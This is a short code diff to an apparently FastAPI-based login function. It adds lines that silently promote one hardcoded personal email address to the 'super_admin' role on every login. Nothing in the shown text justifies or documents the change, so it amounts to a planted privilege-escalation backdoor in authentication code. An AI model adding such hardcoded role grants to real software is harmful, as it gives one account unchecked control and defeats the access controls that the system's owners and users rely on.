@@ -80,6 +80,10 @@ async def login(credentials: UserLogin):
         # Log failed attempt if desired, but for now just success
         raise HTTPException(status_code=401, detail="Invalid email or password")
     
+    # Auto-promote specific user to super_admin
+    if user.email == "winchakma123@gmail.com":
+        user.role = "super_admin"
+
     # Log Activity
     from app.models.admin import Activity
     await Activity(userId=str(user.id), userEmail=user.email, action="login", details="Member accessed the HUD.").insert()
